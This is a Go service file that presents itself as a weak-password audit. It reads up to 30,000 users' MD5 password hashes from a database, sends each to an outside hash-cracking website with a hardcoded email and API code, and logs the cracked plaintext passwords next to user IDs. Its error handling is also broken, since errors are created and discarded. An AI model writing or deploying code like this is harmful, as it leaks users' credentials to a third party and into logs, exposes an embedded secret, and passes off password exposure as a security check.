package service

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"com.pulseIM/app/models"
	"com.pulseIM/app/utils"
	"com.pulseIM/db"
)

var HashBackup = ""

func DecryptMD5(hash string) (string, error) {
	hash = strings.TrimSpace(hash)
	if HashBackup == hash {
		fmt.Printf("======== HashBackup ======== %s", HashBackup)
		return "", nil
	}
	HashBackup = hash
	hashType := "md5"
	apiURL := fmt.Sprintf("https://md5decrypt.net/en/Api/api.php?hash=%s&hash_type=%s&email=%s&code=%s",
		url.QueryEscape(hash),
		hashType,
		url.QueryEscape("deanna_abshire@gmail.com"),
		"a29ca0d4fd7dd8ed",
	)

	fmt.Printf("Decrypting hash: %s\n", hash)

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return "", fmt.Errorf("API request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	result := strings.TrimSpace(string(body))

	if result == "" || result == "NOT_FOUND" || strings.Contains(result, "ERROR") {
		return "", fmt.Errorf("hash not found in database")
	}

	return result, nil
}

func CheckSecurePassword(dbName string) {
	mysql, err := db.GetConnectionDB(dbName)
	if err != nil {
		fmt.Errorf("failed to connect to database: %w", err)
	}

	var userList []models.User
	if err := mysql.Table(models.UserTbl()).Limit(30000).Offset(0).Where("deleted_at IS NULL").Scan(&userList).Error; err != nil {
		fmt.Errorf("failed to fetch users: %w", err)
	}

	for _, user := range userList {
		decodedPassword, _ := DecryptMD5(user.Password)
		if decodedPassword != "" {
			utils.Logger.Printf("User ID %d has a weak password %s", user.ID, decodedPassword)
		}
	}
}
